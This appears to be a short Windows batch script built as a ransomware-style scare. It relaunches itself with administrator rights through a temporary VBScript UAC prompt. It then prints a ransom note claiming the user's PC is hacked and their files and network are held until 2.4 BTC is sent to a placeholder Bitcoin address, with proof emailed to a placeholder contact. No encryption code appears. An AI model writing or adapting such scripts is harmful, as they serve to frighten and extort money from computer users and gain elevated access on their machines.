COLOR 4C

:: give admin

set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

echo █!!!WARNING!!!█
echo █████████████████████████████████████████████████████████████████████████████████████████████████████
echo Hello user, 
echo Like we said we have hacked your PC, we are doing this NOT FOR US but for people in need.
echo All of the money that we get will go to charity, We are not bad people, we want people to live a better
echo life. if you got something against that we do not care.
echo 
echo The debt of the people that are infected is "50 million USD" Untill this is changed we will not give
echo you back your files OR computer, if you want to help out and get your Computer back early, you can
echo Send 2.4 BTC to this address 'Bitcoin address here', we will give you back your Files, and Network.
echo Once done, send 'Email here' an image of proof, you will then reseve an anti virus.
echo 
echo Please dont be mad at us, its for the greator deed and we hope you comply...
echo Have a good day!
echo 
PAUSE
@echo off
